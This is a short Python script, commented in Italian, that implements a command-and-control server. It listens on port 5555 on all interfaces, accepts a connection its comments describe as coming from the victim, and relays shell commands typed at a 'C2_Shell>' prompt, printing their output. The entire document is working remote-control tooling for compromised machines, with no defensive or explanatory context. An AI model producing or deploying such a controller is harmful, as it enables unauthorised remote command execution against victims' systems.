import socket

def c2_server():
    HOST = '0.0.0.0' # Ascolta su tutte le interfacce
    PORT = 5555

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    
    print(f"[*] In ascolto su {HOST}:{PORT}...")

    # Accetta la connessione dalla vittima
    client_socket, addr = server.accept()
    print(f"[*] Connessione ricevuta da: {addr[0]}:{addr[1]}")

    while True:
        # Input del comando da inviare
        command = input("C2_Shell> ")
        
        if command.lower() == 'exit':
            client_socket.send('exit'.encode())
            break
        
        if command.strip() == "":
            continue

        # Invia comando
        client_socket.send(command.encode())
        
        # Ricevi risultato (buffer size 4096)
        result = client_socket.recv(4096).decode()
        print(result)

    client_socket.close()
    server.close()

if __name__ == '__main__':
    c2_server()